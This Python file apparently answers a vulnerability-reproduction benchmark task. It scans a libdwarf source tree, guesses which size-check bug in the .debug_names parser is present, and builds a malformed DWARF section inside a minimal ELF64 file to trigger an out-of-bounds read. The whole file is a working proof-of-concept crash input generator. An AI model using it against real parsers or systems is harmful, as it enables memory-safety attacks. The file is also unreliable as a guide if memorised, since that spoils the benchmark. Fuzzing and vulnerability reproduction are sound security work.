import os
import re
import struct
import tarfile
from typing import List, Optional, Tuple


def _read_text_file(path: str, max_bytes: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        return data.decode("utf-8", "ignore")
    except Exception:
        return ""


def _gather_source_texts_from_dir(root: str) -> Tuple[str, List[str]]:
    debugnames_text = ""
    fuzz_texts: List[str] = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            lfn = fn.lower()
            full = os.path.join(dirpath, fn)
            if debugnames_text == "" and lfn == "dwarf_debugnames.c":
                debugnames_text = _read_text_file(full)
            if lfn.endswith((".c", ".cc", ".cpp", ".cxx")):
                try:
                    sz = os.path.getsize(full)
                except Exception:
                    sz = 0
                if sz <= 300_000:
                    txt = _read_text_file(full, max_bytes=300_000)
                    if "LLVMFuzzerTestOneInput" in txt:
                        fuzz_texts.append(txt)
    return debugnames_text, fuzz_texts


def _gather_source_texts_from_tar(tarpath: str) -> Tuple[str, List[str]]:
    debugnames_text = ""
    fuzz_texts: List[str] = []
    try:
        with tarfile.open(tarpath, "r:*") as tf:
            members = tf.getmembers()
            for m in members:
                nm = m.name
                lnm = nm.lower()
                if debugnames_text == "" and lnm.endswith("dwarf_debugnames.c") and m.size <= 3_000_000:
                    f = tf.extractfile(m)
                    if f:
                        debugnames_text = f.read(3_000_000).decode("utf-8", "ignore")
                if lnm.endswith((".c", ".cc", ".cpp", ".cxx")) and m.size <= 300_000:
                    f = tf.extractfile(m)
                    if f:
                        txt = f.read(300_000).decode("utf-8", "ignore")
                        if "LLVMFuzzerTestOneInput" in txt:
                            fuzz_texts.append(txt)
    except Exception:
        pass
    return debugnames_text, fuzz_texts


def _detect_input_mode(fuzzer_texts: List[str]) -> str:
    if not fuzzer_texts:
        return "elf"
    combined = "\n".join(fuzzer_texts[:5])
    if re.search(r"\bdwarf_(init|init_b|init_path|object_init|object_init_b)\b", combined):
        return "elf"
    if re.search(r"\belf_memory\b|\bElf\b|<libelf\.h>", combined):
        return "elf"
    # If a fuzzer directly targets debug_names parsing without object init, treat as raw.
    if re.search(r"\bdebug_names\b|\bdwarf_debugnames\b", combined) and not re.search(
        r"\bdwarf_(init|object_init)\b", combined
    ):
        return "raw"
    return "elf"


def _analyze_debugnames_bug(debugnames_c: str) -> str:
    if not debugnames_c:
        return "foreign_sig_miscalc"

    idx = debugnames_c.find("augmentation_string_size")
    if idx == -1:
        idx = debugnames_c.find("abbrev_table_size")
    if idx == -1:
        idx = debugnames_c.find("bucket_count")
    if idx == -1:
        idx = len(debugnames_c) // 2
    snippet = debugnames_c[max(0, idx - 2500) : min(len(debugnames_c), idx + 2500)]

    # Heuristic 1: foreign_type_unit_count mistakenly tied to offset_size in size calculations.
    if re.search(r"foreign[^;\n]{0,120}type[^;\n]{0,120}count", snippet, re.IGNORECASE):
        if re.search(r"foreign[^;\n]{0,200}count[^;\n]{0,200}\*[^;\n]{0,200}offset_?size", snippet, re.IGNORECASE):
            return "foreign_sig_miscalc"
        # If size calc for foreign count does not mention 8/signature but mentions offset_size, suspect.
        if "offset_size" in snippet and not re.search(r"foreign[^;\n]{0,200}\*[^;\n]{0,50}8", snippet, re.IGNORECASE):
            if "signature" in snippet or "signatur" in snippet:
                return "foreign_sig_miscalc"

    # Heuristic 2: name_count might be missing hash-table term (name_count*4) in a size/limit calc.
    # Look for name_count used with offset_size but no explicit name_count*4 nearby.
    if re.search(r"name_?count", snippet, re.IGNORECASE):
        has_name_mul4 = bool(re.search(r"name_?count[^;\n]{0,80}\*[^;\n]{0,20}4", snippet, re.IGNORECASE))
        has_name_offsz = bool(re.search(r"name_?count[^;\n]{0,80}\*[^;\n]{0,50}offset_?size", snippet, re.IGNORECASE))
        if has_name_offsz and not has_name_mul4:
            return "missing_hash_term"

    return "foreign_sig_miscalc"


def _build_debug_names_foreign_sig_trunc_32() -> bytes:
    # DWARF32 .debug_names with foreign_type_unit_count=1 but only 4 bytes present for signature (should be 8)
    # unit_length excludes the 4-byte unit_length field itself.
    version = 5
    padding = 0
    comp_unit_count = 0
    local_type_unit_count = 0
    foreign_type_unit_count = 1
    bucket_count = 0
    name_count = 0
    abbrev_table_size = 0
    augmentation_string_size = 0

    header = struct.pack(
        "<HHIIIIIII",
        version,
        padding,
        comp_unit_count,
        local_type_unit_count,
        foreign_type_unit_count,
        bucket_count,
        name_count,
        abbrev_table_size,
        augmentation_string_size,
    )
    # Header is 32 bytes
    sig_trunc = b"\x00\x00\x00\x00"  # 4 bytes only (should be 8)
    unit_length = len(header) + len(sig_trunc)
    return struct.pack("<I", unit_length) + header + sig_trunc


def _build_debug_names_missing_hash_trunc_32() -> bytes:
    # DWARF32 .debug_names with bucket_count=1,name_count=1 but only provide bucket[1] + hash[1] (8 bytes),
    # missing name_offset[1] (4 bytes). If a buggy limit calculation omitted hash-table bytes, it might pass.
    version = 5
    padding = 0
    comp_unit_count = 0
    local_type_unit_count = 0
    foreign_type_unit_count = 0
    bucket_count = 1
    name_count = 1
    abbrev_table_size = 0
    augmentation_string_size = 0

    header = struct.pack(
        "<HHIIIIIII",
        version,
        padding,
        comp_unit_count,
        local_type_unit_count,
        foreign_type_unit_count,
        bucket_count,
        name_count,
        abbrev_table_size,
        augmentation_string_size,
    )
    buckets = struct.pack("<I", 0)
    hashes_only = struct.pack("<I", 0)
    # Intentionally omit name_offsets[1]
    body = header + buckets + hashes_only
    unit_length = len(body)
    return struct.pack("<I", unit_length) + body


def _build_elf64_rel_with_shstrtab_and_debug_names(debug_names_section: bytes) -> bytes:
    # Build a minimal ELF64 ET_REL where .debug_names is placed at end-of-file.
    # Layout:
    # [ELF header (64)]
    # [Section header table (3*64) at e_shoff=64]
    # [Section data: .shstrtab][.debug_names]  (debug_names last)
    EI_MAG = b"\x7fELF"
    e_ident = bytearray(16)
    e_ident[0:4] = EI_MAG
    e_ident[4] = 2  # ELFCLASS64
    e_ident[5] = 1  # little endian
    e_ident[6] = 1  # version
    e_ident[7] = 0  # SYSV
    # rest zeros

    e_type = 1  # ET_REL
    e_machine = 62  # EM_X86_64
    e_version = 1
    e_entry = 0
    e_phoff = 0
    e_shoff = 64
    e_flags = 0
    e_ehsize = 64
    e_phentsize = 0
    e_phnum = 0
    e_shentsize = 64
    e_shnum = 3
    e_shstrndx = 1  # section 1 is .shstrtab

    elf_header = struct.pack(
        "<16sHHIQQQIHHHHHH",
        bytes(e_ident),
        e_type,
        e_machine,
        e_version,
        e_entry,
        e_phoff,
        e_shoff,
        e_flags,
        e_ehsize,
        e_phentsize,
        e_phnum,
        e_shentsize,
        e_shnum,
        e_shstrndx,
    )

    shstrtab = b"\x00.shstrtab\x00.debug_names\x00"
    shstrtab_off = 64 + e_shentsize * e_shnum  # immediately after section headers
    debug_names_off = shstrtab_off + len(shstrtab)
    # No padding: keep .debug_names at end-of-file

    SHT_NULL = 0
    SHT_PROGBITS = 1
    SHT_STRTAB = 3

    # Section headers: (name, type, flags, addr, offset, size, link, info, addralign, entsize)
    sh_null = struct.pack("<IIQQQQIIQQ", 0, SHT_NULL, 0, 0, 0, 0, 0, 0, 0, 0)

    sh_name_shstrtab = 1
    sh_shstrtab = struct.pack(
        "<IIQQQQIIQQ",
        sh_name_shstrtab,
        SHT_STRTAB,
        0,
        0,
        shstrtab_off,
        len(shstrtab),
        0,
        0,
        1,
        0,
    )

    sh_name_debug_names = shstrtab.find(b".debug_names")
    if sh_name_debug_names < 0:
        sh_name_debug_names = 0
    sh_debug_names = struct.pack(
        "<IIQQQQIIQQ",
        sh_name_debug_names,
        SHT_PROGBITS,
        0,
        0,
        debug_names_off,
        len(debug_names_section),
        0,
        0,
        1,
        0,
    )

    sh_table = sh_null + sh_shstrtab + sh_debug_names
    data = shstrtab + debug_names_section
    return elf_header + sh_table + data


class Solution:
    def solve(self, src_path: str) -> bytes:
        debugnames_c = ""
        fuzzer_texts: List[str] = []

        if os.path.isdir(src_path):
            debugnames_c, fuzzer_texts = _gather_source_texts_from_dir(src_path)
        else:
            debugnames_c, fuzzer_texts = _gather_source_texts_from_tar(src_path)

        mode = _detect_input_mode(fuzzer_texts)
        bug = _analyze_debugnames_bug(debugnames_c)

        if bug == "missing_hash_term":
            dbg_names = _build_debug_names_missing_hash_trunc_32()
        else:
            dbg_names = _build_debug_names_foreign_sig_trunc_32()

        if mode == "raw":
            return dbg_names
        return _build_elf64_rel_with_shstrtab_and_debug_names(dbg_names)